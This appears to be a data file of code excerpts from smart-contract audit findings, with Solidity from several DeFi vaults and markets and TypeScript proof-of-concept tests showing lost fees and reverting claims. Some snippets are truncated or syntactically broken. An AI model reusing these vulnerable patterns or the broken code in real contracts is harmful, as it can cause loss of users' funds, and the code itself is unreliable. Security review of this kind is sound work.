IVault(vault).depositProfitTokenForUsers(sentToVault);\n    }\n}\n```\n```\nfunction depositProfitTokenForUsers(uint256 _amount) external nonReentrant {\n    if (_amount == 0) {\n        revert NYProfitTakingVault__ZeroAmount();\n    }\n    if (block.timestamp <= lastProfitTime) {\n        revert NYProfitTakingVault__ProfitTimeOutOfBounds();\n    }\n    if (msg.sender!= strategy) {\n        revert NYProfitTakingVault__OnlyStrategy();\n    }\n    uint256 totalShares = totalSupply();\n    if (totalShares == 0) {\n        lastProfitTime = block.timestamp;\n        return;\n    }\n    accProfitTokenPerShare += ((_amount * PROFIT_TOKEN_PER_SHARE_PRECISION) / totalShares);\n    lastProfitTime = block.timestamp;\n    // Now pull in the tokens (Should have permission)\n    // We only want to pull the tokens with accounting\n    profitToken.transferFrom(strategy, address(this), _amount);\n    emit ProfitReceivedFromStrategy(_amount);\n}\n```"
"```\nfunction onReward(uint _pid, address _user, address _to, uint, uint _amt) external override onlyParent nonReentrant {\n    PoolInfo memory pool = updatePool(_pid);\n\n    if (pool.lastRewardTime == 0) {\n        return;\n    }\n\n    UserInfo storage user = userInfo[_pid][_user];\n    uint pending;\n\n    if (user.amount > 0) {\n        pending = ((user.amount * pool.accRewardPerShare) / ACC_TOKEN_PRECISION) - user.rewardDebt;\n        rewardToken.safeTransfer(_to, pending);\n    }\n\n    user.amount = _amt;\n    user.rewardDebt = (_amt * pool.accRewardPerShare) / ACC_TOKEN_PRECISION;\n\n    emit LogOnReward(_user, _pid, pending, _to);\n}\n```\n```\nuint len = childrenRewarders.length();\nfor (uint i = 0; i < len; i++) {\n    IRewarder(childrenRewarders.at(i)).onReward(_pid, _user, _to, 0, _amt);\n}\n```"
"```\nuser.amount = _amt;\nuser.rewardDebt = (_amt * pool.accRewardPerShare) / ACC_TOKEN_PRECISION;\nuser.rewardsOwed = rewardsOwed;\n```\nif (address(rewarder)!= address(0)) {\n    rewarder.onReward(0, msg.sender, msg.sender, pending, user.amount);\n}\n\n_burn(msg.sender, _shares);\n\nuint256 userAmount = balanceOf(msg.sender);\n\nif (userAmount == 0) {\n    user.amount = 0;\n} else {\n    user.amount -= r;\n}\n```"
"```\n// Now pull in the tokens (Should have permission)\nprofitToken.transferFrom(strategy, address(this), _amount);\nemit ProfitReceivedFromStrategy(_amount);\n```"
```\nuint256 userAmount = balanceOf(msg.sender);\n\nif (userAmount == 0) {\n    user.amount = 0;\n} else {\n    user.amount -= r;\n}\n```\n```\nuint256 r = (balance() * _shares) / totalSupply();\n```\nfunction deposit(uint256 _amount) public nonReentrant {\n   ...\n    user.amount += _amount;\n   ...\n}\n```
"```\nfunction _swapFarmEmissionTokens() internal {\n    IERC20Upgradeable boo = IERC20Upgradeable(BOO);\n    uint256 booBalance = boo.balanceOf(address(this));\n\n    if (booToUsdcPath.length < 2 || booBalance == 0) {\n        return;\n    }\n\n    boo.safeIncreaseAllowance(SPOOKY_ROUTER, booBalance);\n\n    uint256[] memory amounts = IUniswapV2Router02(SPOOKY_ROUTER).getAmountsOut(booBalance, booToUsdcPath);\n\n    uint256 amountOutMin = (amounts[amounts.length - 1] * MAX_SLIPPAGE) / PERCENT_DIVISOR;\n\n    IUniswapV2Router02(SPOOKY_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(booBalance, amountOutMin, booToUsdcPath, address(this), block.timestamp);\n}"
```\nstruct PoolInfo {\n    uint128 accRewardPerShare;\n    uint64 lastRewardTime;\n    uint64 allocPoint;\n}\n```
"```\nuint256 _pool = balance();\nif (_pool + _amount > underlyingCap) {\n    revert NYProfitTakingVault__UnderlyingCapReached(underlyingCap);\n}\n\nuint256 _before = underlying.balanceOf(address(this));\nunderlying.safeTransferFrom(msg.sender, address(this), _amount);\nuint256 _after = underlying.balanceOf(address(this));\n_amount = _after - _before;\n```"
```\nif (block.timestamp <= lastProfitTime) {\n    revert NYProfitTakingVault__ProfitTimeOutOfBounds();\n}\n```
"```\nif (inversed && balance < amountDesired) {\n    uint256 transferAmount = amountDesired - balance;\n    uint256 parentPoolBalance = ILiquidityPool(parentLiquidityPool).getBalance(address(token0));\n    if (parentPoolBalance < transferAmount) {\n        revert CustomErrors.WithdrawExceedsLiquidity();\n    }\n    SafeTransferLib.safeTransferFrom(address(token0), msg.sender, address(this), transferAmount);\n}\n```\n```\nfunction createUniswapRangeOrder(\n    RangeOrderParams calldata params,\n    uint256 amountDesired\n) external {\n    require(!_inActivePosition(), ""RangeOrder: active position"");\n    _onlyManager();\n\n    bool inversed = collateralAsset == address(token0);\n    _createUniswapRangeOrder(params, amountDesired, inversed);\n}\n```"
"```\nuint256 priceToUse = quotePrice < underlyingPrice? quotePrice : underlyingPrice;\nRangeOrderDirection direction = inversed? RangeOrderDirection.ABOVE : RangeOrderDirection.BELOW;\nRangeOrderParams memory rangeOrder = _getTicksAndMeanPriceFromWei(priceToUse, direction);\n```\n```\nint24 lowerTick = direction == RangeOrderDirection.ABOVE?\n    nearestTick + tickSpacing : nearestTick - (2 * tickSpacing);\n\nint24 tickUpper = direction == RangeOrderDirection.ABOVE?\n    lowerTick + tickSpacing : nearestTick - tickSpacing;\n```"
"```\nfunction getPoolPrice() public view returns (uint256 price, uint256 inversed) {\n    (uint160 sqrtPriceX96,,,,,, ) = pool.slot0();\n    uint256 p = uint256(sqrtPriceX96) * uint256(sqrtPriceX96) * (10 ** token0.decimals());\n    // token0/token1 in 1e18 format\n    price = p / (2 ** 192);\n    inversed = 1e36 / price;\n}\n```"
"```\nuint256 intermediate = inWei.div(10 ** (token1.decimals() - token0.decimals()));\n```\n```\nmeanPrice = OptionsCompute.convertFromDecimals(meanPrice, \n                                             token0.decimals(), \n                                             token1.decimals())\n```\n```\nfunction convertFromDecimals(uint256 value, uint8 decimalsA, uint8 decimalsB) internal pure returns (uint256) {\n    if (decimalsA > decimalsB) {\n        revert();\n    }\n   ...\n```"
"```\nfunction _sqrtPriceX96ToUint(uint160 sqrtPriceX96) private pure returns (uint256) {\n    uint256 numerator1 = uint256(sqrtPriceX96) * uint256(sqrtPriceX96);\n    return FullMath.mulDiv(numerator1, 1, 1 << 192);\n}\n```"
"```\nif (inversed) {\n    uint256 wethBalance = amount1Current;\n} else {\n    uint256 wethBalance = amount0Current;\n}\nif (wethBalance < minAmount) {\n    return 0;\n}\n```\n```\nuint256 deltaToUse = _delta > int256(wethBalance)? uint256(wethBalance) : uint256(_delta);\n_createUniswapRangeOrder(rangeOrder, deltaToUse, inversed);\n```"
"```\nrequire(\n    IERC20(outputTokenAddress).balanceOf(address(this)) >= \n    (totalAllocatedOutputToken - totalReleasedOutputToken), \n    ""INSUFFICIENT_OUTPUT_TOKEN""\n);\n\nIERC20(inputTokenAddress).transferFrom(msg.sender, address(0), _inputTokenAmount);\n```\n```\nIERC20(inputTokenAddress).transferFrom(msg.sender, address(0), \n    _inputTokenAmount);\n\nSafeERC20.safeTransfer(IERC20(outputTokenAddress), msg.sender, \n    allocation);\n\nemit OutputTokenInstantReleased(msg.sender, allocation, \n    outputTokenAddress);\n```"
```\nuint256 allocation = (_inputTokenAmount * linearMultiplier) / tokenDecimalDivider;\nuint256 allocation = (_inputTokenAmount * instantMultiplier) / tokenDecimalDivider;\n```
"```\nif (!newOrder.isEmpty()):\n    oracle.request(IMarket(this), account)\n```\n```\nfunction isEmpty(Order memory self) internal pure returns (bool) {\n    return pos(self).isZero() && neg(self).isZero();\n}\n\nfunction pos(Order memory self) internal pure returns (UFixed6) {\n    return self.makerPos.add(self.longPos).add(self.shortPos);\n}\n\nfunction neg(Order memory self) internal pure returns (UFixed6) {\n    return self.makerNeg.add(self.longNeg).add(self.shortNeg);\n}\n```\n```\nfunction _processOrderGlobal(\n    Context memory context,\n    SettlementContext memory settlementContext,\n    uint256 newOrderId,\n    Order memory newOrder\n) private {\n    OracleVersion memory oracleVersion = oracle.at(newOrder.timestamp);\n\n    context.pending.global.sub(newOrder);\n    if (!oracleVersion.valid) {\n        newOrder.invalidate();\n    }\n\n    VersionAccumulationResult memory accumulationResult;\n    (\n        settlementContext.latestVersion,\n        context.global,\n        accumulationResult\n    ) = VersionLib.accumulate(\n        settlementContext.latestVersion,\n        context.global,\n        context.latestPosition.global,\n        newOrder,\n        settlementContext.orderOracleVersion,\n        oracleVersion,\n        context.marketParameter,\n        context.riskParameter\n    );\n}\n```\nfunction _accumulateLinearFee(\n    Version memory next,\n    AccumulationContext memory context,\n    VersionAccumulationResult memory result\n) private pure {\n    (\n        UFixed6 makerLinearFee,\n        UFixed6 makerSubtractiveFee\n    ) = _accumulateSubtractiveFee(\n        context.riskParameter.makerFee.linear(\n            Fixed6Lib.from(context.order.makerTotal()),\n            context.toOracleVersion.price.abs()\n        ),\n        context.order.makerTotal(),\n        context.order.makerReferral,\n        next.makerLinearFee\n    );\n\n    // Compute maker linear fee\n    makerLinearFee = makerLinearFee.add(makerSubtractiveFee);\n\n    // Compute long-short funding rate\n    Fixed6 funding = context.global.pAccumulator.accumulate(\n        context.riskParameter.pController,\n        toSkew.unsafeDiv(Fixed6Lib.from(context.riskParameter.takerFee.scale)).min(Fixed6Lib.ONE).max(Fixed6Lib.NEG_ONE),\n        context.fromOracleVersion.timestamp,\n        context.toOracleVersion.timestamp,\n        context.fromPosition.takerSocialized().mul(context.fromOracleVersion.price.abs())\n    );\n\n    // Compute interest\n    function _accumulateInterest(\n        Version memory next,\n        AccumulationContext memory context\n    ) private pure returns (Fixed6 interestMaker, Fixed6 interestLong, Fixed6 interestShort, UFixed6 interestFee) {\n        UFixed6 notional = context.fromPosition.long.add(context.fromPosition.short).min(context.fromPosition.maker).mul(context.fromOracleVersion.price.abs());\n\n        // Compute interest maker\n        Fixed6 interestMaker = notional.mul(context.riskParameter.makerFee.scale);\n\n        // Compute interest long\n        Fixed6 interestLong = notional.mul(context.riskParameter.longFee.scale);\n\n        // Compute interest short\n        Fixed6 interestShort = notional.mul(context.riskParameter.shortFee.scale);\n\n        // Compute interest fee\n        UFixed6 interestFee = notional.mul(context.riskParameter.interestFee.scale);\n    }\n}\n```\nfunction _settle(IMarket market, address account) private {\n    market.update(\n        account,\n        UFixed6Lib.MAX,\n        UFixed6Lib.MAX,\n        UFixed6Lib.MAX,\n        Fixed6Lib.ZERO,\n        false\n    );\n}\n```\n```\nit('no fees accumulation due to invalid version with price = 0', async () => {\n  function setupOracle(price: string, timestamp: number, nextTimestamp: number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp: timestamp,\n      valid: true,\n    };\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n    oracle.status.returns([oracleVersion, nextTimestamp]);\n    oracle.request.returns();\n  }\n\n  function setupOracleAt(price: string, valid: boolean, timestamp: number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp: timestamp,\n      valid: valid,\n    };\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n  }\n\n  const riskParameter = await market.riskParameter();\n  const riskParameterMakerFee = riskParameter.makerFee;\n  riskParameterMakerFee.linearFee = parse6decimal('0.005');\n  riskParameterMakerFee.proportionalFee = parse6decimal('0.0025');\n  riskParameterMakerFee.adiabaticFee = parse6decimal('0.01');\n  riskParameter.makerFee = riskParameterMakerFee;\n  const riskParameterTakerFee = riskParameter.takerFee;\n  riskParameterTakerFee.linearFee = parse6decimal('0.005');\n  riskParameterTakerFee.proportionalFee = parse6decimal('0.0025');\n  riskParameterTakerFee.adiabaticFee = parse6decimal('0.01');\n  riskParameter.takerFee = riskParameterTakerFee;\n  await market.connect(owner).updateRiskParameter(riskParameter);\n\n  dsu.transferFrom.whenCalledWith(user.address, market.address, COLLATERAL.mul(1e12)).returns(true);\n  dsu.transferFrom.whenCalledWith(userB.address, market.address, COLLATERAL.mul(1e12)).returns(true);\n\n  setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n  await market\n   .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\n  await market\n   .connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, POSITION, 0, COLLATERAL, false);\n\n  setupOracle('100', TIMESTAMP + 100, TIMESTAMP +\n```\nversion 200: longValue: -318 makerValue: 285\nversion 300: longValue: -100000637 makerValue: 100500571\nversion 400: longValue: -637 makerValue: 571\n```"
"```\nfunction update(\n    Account memory self,\n    uint256 currentId,\n    UFixed6 assets,\n    UFixed6 shares,\n    UFixed6 deposit,\n    UFixed6 redemption\n) internal pure {\n    self.current = currentId;\n    (self.assets, self.shares) = (self.assets.sub(assets), self.shares.sub(shares));\n    (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));\n}\n```"
"```\nfunction _commitRequested(OracleVersion memory version) private returns (bool) {\n    if (block.timestamp <= (next() + timeout)) {\n        if (!version.valid) {\n            revert KeeperOracleInvalidPriceError();\n        }\n        _prices[version.timestamp] = version.price;\n    } else {\n        _prices[version.timestamp] = _prices[_global.latestVersion];\n    }\n    _global.latestIndex++;\n    return true;\n}\n```\n```\nfunction _processOrderGlobal(\n    Context memory context,\n    SettlementContext memory settlementContext,\n    uint256 newOrderId,\n    Order memory newOrder\n) private {\n    OracleVersion memory oracleVersion = oracle.at(newOrder.timestamp);\n\n    context.pending.global.sub(newOrder);\n    if (!oracleVersion.valid) {\n        newOrder.invalidate();\n    }\n```\n```\nfunction at(uint256 timestamp) public view returns (OracleVersion memory oracleVersion) {\n    (oracleVersion.timestamp, oracleVersion.price) = (timestamp, _prices[timestamp]);\n    oracleVersion.valid =!oracleVersion.price.isZero();\n}\n```"
"```\nmarketCollateral = marketContext.margin\n   .add(collateral.sub(totalMargin).mul(marketContext.registration.weight));\n\nUFixed6 marketAssets = assets\n   .mul(marketContext.registration.weight)\n   .min(marketCollateral.mul(LEVERAGE_BUFFER));\n```\n```\ntarget.position = marketAssets\n   .muldiv(marketContext.registration.leverage, marketContext.latestPrice.abs())\n   .max(marketContext.minPosition)\n   .min(marketContext.maxPosition);\n```\n```\nit('simple deposits and redemptions', async () => {\n  expect(await position()).to.equal(\n    smallDeposit.add(largeDeposit).mul(leverage).mul(4).div(5).div(originalOraclePrice),\n  )\n  expect(await btcPosition()).to.equal(\n    smallDeposit.add(largeDeposit).mul(leverage).div(5).div(btcOriginalOraclePrice),\n  )\n\n  console.log(""pos1 = "" + (await position()) + "" pos2 = "" + (await btcPosition()) + "" col1 = "" + (await collateralInVault()) + "" col2 = "" + (await btcCollateralInVault()));\n\n  await vault.connect(owner).updateWeights([parse6decimal('1.0'), parse6decimal('0')])\n\n  await vault.connect(user).update(user.address, 0, smallDeposit, 0)\n  await updateOracle()\n\n  console.log(""pos1 = "" + (await position()) + "" pos2 = "" + (await btcPosition()) + "" col1 = "" + (await collateralInVault()) + "" col2 = "" + (await btcCollateralInVault()));\n})\n```\npos1 = 12224846\npos2 = 206187\ncol1 = 8008000000\ncol2 = 2002000000\n\npos1 = 12224846\npos2 = 206187\ncol1 = 9209203452\ncol2 = 800796548\n```"
"```\nit('adiabatic fee', async () => {\n  function setupOracle(price: string, timestamp: number, nextTimestamp: number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp: timestamp,\n      valid: true,\n    };\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n    oracle.status.returns([oracleVersion, nextTimestamp]);\n    oracle.request.returns();\n  }\n\n  async function showInfo() {\n    await market.settle(user.address);\n    await market.settle(userB.address);\n    await market.settle(userC.address);\n    let sum: BigNumber = BigNumber.from('0');\n    let info = await market.locals(user.address);\n    console.log(""user collateral = "" + info.collateral);\n    sum = sum.add(info.collateral);\n    info = await market.locals(userB.address);\n    sum = sum.add(info.collateral);\n    console.log(""userB collateral = "" + info.collateral);\n    info = await market.locals(userC.address);\n    sum = sum.add(info.collateral);\n  }\n\n  async function showVer(ver: number) {\n    let v = await market.versions(ver);\n    console.log(""ver"" + ver + "": makerValue="" + v.makerValue + "" longValue="" + v.longValue +\n      "" makerPosFee="" + v.makerPosFee + "" makerNegFee="" + v.makerNegFee +\n      "" takerPosFee="" + v.takerPosFee + "" takerNegFee="" + v.takerNegFee);\n  }\n\n  const riskParameter = await market.riskParameter();\n  const riskParameterMakerFee = riskParameter.makerFee;\n  riskParameterMakerFee.linearFee = parse6decimal('0.00');\n  riskParameterMakerFee.proportionalFee = parse6decimal('0.00');\n  riskParameterMakerFee.adiabaticFee = parse6decimal('0.01');\n  riskParameterMakerFee.scale = parse6decimal('50.0');\n  riskParameter.makerFee = riskParameterMakerFee;\n  const riskParameterTakerFee = riskParameter.takerFee;\n  riskParameterTakerFee.linearFee = parse6decimal('0.00');\n  riskParameterTakerFee.proportionalFee = parse6decimal('0.00');\n  riskParameterTakerFee.adiabaticFee = parse6decimal('0.01');\n  riskParameterTakerFee.scale = parse6decimal('50.0\n```\nuser collateral = 10000000000\nuserB collateral = 0\nver1636401093: makerValue=0 longValue=0 makerPosFee=0 makerNegFee=0 takerPosFee=0 takerNegFee=0\n\nuser collateral = 10000090000\nuserB collateral = 10000000000\nver1636401193: makerValue=0 longValue=0 makerPosFee=9000 makerNegFee=0 takerPosFee=0 takerNegFee=0\n\nuser collateral = 10000090000\nuserB collateral = 10000070000\nver1636401293: makerValue=0 longValue=0 makerPosFee=7000 makerNegFee=0 takerPosFee=0 takerNegFee=0\n\nuser collateral = 10000170000\nuserB collateral = 10000150000\nver1636401393: makerValue=8000 longValue=0 makerPosFee=0 makerNegFee=0 takerPosFee=0 takerNegFee=0\n\nuser collateral = 10000170000\nuserB collateral = 10000010000\nver1636401493: makerValue=8000 longValue=0 makerPosFee=0 makerNegFee=-14000 takerPosFee=0 takerNegFee=0\n\nuser collateral = 9999990000\nuserB collateral = 10000010000\nver1636401593: makerValue=-5500 longValue=0 makerPosFee=0 makerNegFee=-4500 takerPosFee=0 takerNegFee=0\n```"
"```\n_manage(\n    context,\n    depositAssets,\n    claimAmount,\n   !depositAssets.isZero() ||!redeemShares.isZero()\n)\n```\nUFixed6 collateral = UFixed6Lib.unsafeFrom(strategy.totalCollateral).add(deposit).unsafeSub(withdrawal);\nUFixed6 assets = collateral.unsafeSub(ineligable);\n\nif (collateral.lt(strategy.totalMargin)) {\n    revert StrategyLibInsufficientCollateralError();\n}\n\nif (assets.lt(strategy.minAssets)) {\n    revert StrategyLibInsufficientAssetsError();\n}\n```\n```\nfunction _ineligable(\n    Context memory context,\n    UFixed6 withdrawal\n) private pure returns (UFixed6) {\n    UFixed6 redemptionEligable = UFixed6Lib.unsafeFrom(context.totalCollateral)\n       .unsafeSub(withdrawal)\n       .unsafeSub(context.global.assets)\n       .unsafeSub(context.global.deposit);\n\n    return redemptionEligable\n       .mul(context.global.redemption.unsafeDiv(context.global.shares.add(context.global.redemption)))\n       .add(context.global.assets)\n       .add(withdrawal);\n}\n```\nif (assets.lt(strategy.minAssets)) {\n    revert StrategyLibInsufficientAssetsError();\n}\n```\n```\nit('simple deposits and redemptions', async () => {\n  // Now we should have opened positions.\n  // The positions should be equal to (smallDeposit + largeDeposit) * leverage originalOraclePrice.\n  expect(await position()).to.equal(\n    smallDeposit.add(largeDeposit).mul(leverage).mul(4).div(5).div(originalOraclePrice),\n  )\n  expect(await btcPosition()).to.equal(\n    smallDeposit.add(largeDeposit).mul(leverage).div(5).div(btcOriginalOraclePrice),\n  )\n\n  var half = smallDeposit.add(largeDeposit).div(2).add(smallDeposit);\n  await vault.connect(user).update(user.address, 0, half, 0);\n\n  await updateOracle();\n  await vault.connect(user2).update(user2.address, smallDeposit, 0, 0); // this will create min position in the market\n  await vault.connect(user).update(user.address, 0, 0, half); // this will revert even though it's just claiming\n})"
"```\nfunction _credit(address account, UFixed6 amount) private {\n    if (amount.isZero()) return;\n\n    Local memory newLocal = _locals[account].read();\n    newLocal.credit(amount);\n    _locals[account].store(newLocal);\n\n    _credit(liquidators[account][newOrderId], accumulationResult.liquidationFee);\n    _credit(referrers[account][newOrderId], accumulationResult.subtractiveFee);\n}\n```\n```\nfunction _storeContext(Context memory context, address account) private {\n    _global.store(context.global);\n    _locals[account].store(context.local);\n}\n```\n```\nfunction settle(address account) external nonReentrant whenNotPaused {\n    Context memory context = _loadContext(account);\n\n    _settle(context, account);\n\n    _storeContext(context, account);\n}\n```\nit('self-liquidation fees lost', async () => {\n  const POSITION = parse6decimal('100.000');\n  const COLLATERAL = parse6decimal('120');\n\n  function setupOracle(price: string, timestamp: number, nextTimestamp: number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp,\n      valid: true,\n    };\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n    oracle.status.returns([oracleVersion, nextTimestamp]);\n    oracle.request.returns();\n  }\n\n  dsu.transferFrom.whenCalledWith(user.address, market.address, COLLATERAL.mul(1e12)).returns(true);\n  dsu.transferFrom.whenCalledWith(userB.address, market.address, COLLATERAL.mul(1e12)).returns(true);\n\n  let time = TIMESTAMP;\n\n  setupOracle('1', time, time + 100);\n  await market.connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n  await market.connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, POSITION, 0, COLLATERAL, false);\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n\n  time += 100;\n  setupOracle('0.7', time, time + 100);\n\n  // self-liquidate\n  setupOracle('0.7', time, time + 100);\n  await market.connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, 0, 0, 0, true);\n\n  // settle liquidation\n  time += 100;\n  setupOracle('0.7', time, time + 100);\n  await market.settle(userB.address);\n  var info = await market.locals(userB.address);\n  console.log(""Claimable userB: "" + info.claimable);\n})\n```\nClaimable userB: 0\n```"
```\nfunction _loadContext(\n    Registration memory registration\n) private view returns (MarketStrategyContext memory marketContext) {\n    // current position\n    Order memory pendingGlobal = registration.market.pendings(address(this));\n    marketContext.currentPosition = registration.market.position();\n    marketContext.currentPosition.update(pendingGlobal);\n    marketContext.minPosition = marketContext.currentAccountPosition.maker\n       .sub(\n            marketContext.currentPosition.maker\n               .sub(\n                    marketContext.currentPosition.skew().abs()\n                ).min(\n                    marketContext.closable\n                )\n        );\n    marketContext.maxPosition = marketContext.currentAccountPosition.maker\n       .add(\n            marketContext.riskParameter.makerLimit\n               .sub(\n                    marketContext.currentPosition.maker\n                )\n        );\n}\n```
"```\nfunction _loadUpdateContext(\n    Context memory context,\n    address account,\n    address referrer\n) private view returns (UpdateContext memory updateContext) {\n    updateContext.referrer = referrers[account][context.local.currentId];\n    updateContext.referralFee = IMarketFactory(address(factory())).referralFee(referrer);\n}\n\nfunction _processReferrer(\n    UpdateContext memory updateContext,\n    Order memory newOrder,\n    address referrer\n) private pure {\n    if (newOrder.makerReferral.isZero() && newOrder.takerReferral.isZero()) return;\n    if (updateContext.referrer == address(0)) updateContext.referrer = referrer;\n    if (updateContext.referrer == referrer) return;\n\n    revert MarketInvalidReferrerError();\n}\n\nfunction _storeUpdateContext(\n    Context memory context,\n    UpdateContext memory updateContext,\n    address account\n) private {\n    referrers[account][context.local.currentId] = updateContext.referrer;\n}\n```"
"```\nif (\n   !PositionLib.margined(\n        context.latestPosition.local.magnitude().add(context.pending.local.pos()),\n        context.latestOracleVersion,\n        context.riskParameter,\n        context.local.collateral\n    )\n) {\n    revert IMarket.MarketInsufficientMarginError();\n}\n```\n```\nfunction _settle(IMarket market, address account) private {\n    market.update(\n        account,\n        UFixed6Lib.MAX,\n        UFixed6Lib.MAX,\n        UFixed6Lib.MAX,\n        Fixed6Lib.ZERO,\n        false\n    );\n}\n```\n```\nfunction _updateUnderlying() private {\n    for (uint256 marketId; marketId < totalMarkets; marketId++) {\n        _registrations[marketId].read().market.update(\n            address(this),\n            UFixed6Lib.MAX,\n            UFixed6Lib.ZERO,\n            UFixed6Lib.ZERO,\n            Fixed6Lib.ZERO,\n            false\n        );\n    }\n}\n```"
"```\nfunction toSharesGlobal(Checkpoint memory self, UFixed6 assets) internal pure returns (UFixed6) {\n    if (self.shares.isZero()) {\n        return assets;\n    }\n\n    if (self.assets.lte(Fixed6Lib.ZERO)) {\n        return assets;\n    }\n\n    return _toShares(self, _withoutSettlementFeeGlobal(self, assets));\n}\n\nfunction _toShares(Checkpoint memory self, UFixed6 assets) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    return _withSpread(self, assets.muldiv(self.shares, selfAssets));\n}\n\nfunction _withSpread(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    UFixed6 totalAmount = self.deposit.add(self.redemption.muldiv(selfAssets, self.shares));\n    UFixed6 totalAmountIncludingFee = UFixed6Lib.unsafeFrom(Fixed6Lib.from(totalAmount).sub(self.tradeFee));\n\n    return totalAmount.isZero()? amount : amount.muldiv(totalAmountIncludingFee, totalAmount);\n}\n\nfunction _withoutSettlementFeeGlobal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    return _withoutSettlementFee(amount, self.settlementFee);\n}\n\nfunction _withoutSettlementFee(UFixed6 amount, UFixed6 settlementFee) private pure returns (UFixed6) {\n    return amount.unsafeSub(settlementFee);\n}\n```"
"```\n/// @notice Commits the price to specified version\n/// @dev Accepts both requested and non-requested versions.\n///      Requested versions will pay out a keeper fee, non-requested versions will not.\n///      Accepts any publish time in the underlying price message, as long as it is within the validity window,\n///      which means its possible for publish times to be slightly out of order with respect to versions.\n///      Batched updates are supported by passing in a list of price feed ids along with a valid batch update data.\nfunction commit(bytes32[] memory ids, uint256 version, bytes calldata data) external payable {\n    // code\n}\n```\n```\nfunction _applicableValue(uint256, bytes memory data) internal view override returns (uint256) {\n    bytes[] memory payloads = abi.decode(data, (bytes[]));\n    uint256 totalFeeAmount = 0;\n    for (uint256 i = 0; i < payloads.length; i++) {\n        (, bytes memory report) = abi.decode(payloads[i], (bytes32[3], bytes));\n        (Asset memory fee,,) = feeManager.getFeeAndReward(address(this), report, feeTokenAddress);\n        totalFeeAmount += fee.amount;\n    }\n    return totalFeeAmount;\n}\n```"
```\nif (to!= address(this)) {\n    _updateFeeRewards(to);\n}\n```
"```\nfunction _addLiquidity(\n    address token,\n    uint256 tokenDesired,\n    uint256 wethDesired,\n    uint256 tokenMin,\n    uint256 wethMin,\n    GoatTypes.InitParams memory initParams\n) internal returns (uint256, uint256, bool) {\n    GoatTypes.LocalVariables_AddLiquidity memory vars;\n    GoatV1Pair pair = GoatV1Pair(GoatV1Factory(FACTORY).getPool(token));\n    if (address(pair) == address(0)) {\n        pair = GoatV1Pair(GoatV1Factory(FACTORY).createPair(token, initParams));\n        vars.isNewPair = true;\n    }\n\n    if (vars.isNewPair) {\n        // rest of code\n    } else {\n        (uint256 wethReserve, uint256 tokenReserve) = pair.getReserves();\n        uint256 tokenAmountOptimal = GoatLibrary.quote(wethDesired, wethReserve, tokenReserve);\n        if (tokenAmountOptimal <= tokenDesired) {\n            if (tokenAmountOptimal < tokenMin) {\n                revert GoatErrors.InsufficientTokenAmount();\n            }\n            (vars.tokenAmount, vars.wethAmount) = (tokenAmountOptimal, wethDesired);\n        } else {\n            uint256 wethAmountOptimal = GoatLibrary.quote(tokenDesired, tokenReserve, wethReserve);\n            assert(wethAmountOptimal <= wethDesired);\n            if (wethAmountOptimal < wethMin) {\n                revert GoatErrors.InsufficientWethAmount();\n            }\n            (vars.tokenAmount, vars.wethAmount) = (tokenDesired, wethAmountOptimal);\n        }\n    }\n    return (vars.tokenAmount, vars.wethAmount, vars.isNewPair);\n}\n```\n```\nfunction addLiquidity(\n    address token,\n    uint256 tokenDesired,\n    uint256 wethDesired,\n    uint256 tokenMin,\n    uint256 wethMin,\n    address to,\n    uint256 deadline,\n    GoatTypes.InitParams memory initParams\n) external nonReentrant ensure(deadline) returns (uint256, uint256, uint256) {\n    IERC20(token).safeTransferFrom(msg.sender, vars.pair, vars.actualTokenAmount);\n    if (vars.wethAmount!= 0) {\n        IERC20(WETH).safeTransferFrom(msg.sender, vars.pair, vars.wethAmount);\n    }\n    vars.liquidity = GoatV1Pair(vars.pair).mint(to);\n}\n```\n```\nfunction mint(address to) external nonReentrant returns (uint256 liquidity) {\n    if (_vestingUntil == _MAX_UINT32) {\n        if (totalSupply_ > 0) {\n            revert GoatErrors.PresalePeriod();\n        }\n        if (balanceEth > mintVars.bootstrapEth) {\n            revert GoatErrors.SupplyMoreThanBootstrapEth();\n        }\n        if (balanceEth < mintVars.bootstrapEth) {\n            (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = _tokenAmountsForLiquidityBootstrap(\n                mintVars.virtualEth, mintVars.bootstrapEth, balanceEth, mintVars.initialTokenMatch\n            );\n            if (balanceToken!= (tokenAmtForPresale + tokenAmtForAmm)) {\n                revert GoatErrors.InsufficientTokenAmount();\n            }\n            liquidity = Math.sqrt(uint256(mintVars.virtualEth) * uint256(mintVars.initialTokenMatch)) - MINIMUM_LIQUIDITY;\n        } else {\n            liquidity = Math.sqrt(balanceEth * balanceToken) - MINIMUM_LIQUIDITY;\n            uint32 timestamp = uint32(block.timestamp);\n            _vestingUntil = timestamp + VESTING_PERIOD;\n        }\n        mintVars.isFirstMint = true;\n    }\n}"
